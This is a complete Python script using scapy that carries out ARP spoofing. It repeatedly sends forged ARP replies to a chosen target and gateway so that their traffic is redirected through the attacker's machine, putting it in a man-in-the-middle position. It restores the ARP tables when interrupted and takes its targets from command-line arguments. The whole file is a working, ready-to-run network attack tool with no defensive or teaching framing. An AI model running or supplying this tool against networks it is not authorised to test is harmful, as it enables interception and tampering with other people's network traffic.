import scapy.all as scapy
import time
import argparse
import sys

def get_mac(ip):
    # Create an ARP request addressed to the broadcast MAC address
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    req_packet = broadcast_packet / arp_packet

    # Send the packet and capture the response
    answered_list = scapy.srp(req_packet, timeout=1, verbose=False)[0]

    # Get the MAC address from the response
    return answered_list[0][1].hwsrc if answered_list else None

def spoof_arp(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print(f"[-] Could not find MAC address for {target_ip}")
        return
    
    # Create an ARP response packet
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=target_mac) / arp_response
    scapy.sendp(ether_frame, verbose=False)

def restore_arp(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    if dest_mac is None or src_mac is None:
        return
    
    # Create an ARP response packet to restore the network
    arp_response = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.sendp(arp_response, count=4, verbose=False)

def main(target_ip, gateway_ip):
    sent_packet_count = 0
    try:
        while True:
            spoof_arp(target_ip, gateway_ip)
            spoof_arp(gateway_ip, target_ip)
            sent_packet_count += 2
            print(f"\r[+] Packets sent: {sent_packet_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C! Restoring the network...")
        restore_arp(target_ip, gateway_ip)
        restore_arp(gateway_ip, target_ip)
        print("[+] Network restored. Exiting...")

def parse():
    parser = argparse.ArgumentParser(description="ARP Spoofing")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP", required=True)
    options = parser.parse_args()

    if not options.target_ip or not options.gateway_ip:
        print("[-] Both target IP and gateway IP must be specified.")
        sys.exit(1)

    main(options.target_ip, options.gateway_ip)

if __name__ == "__main__":
    parse()
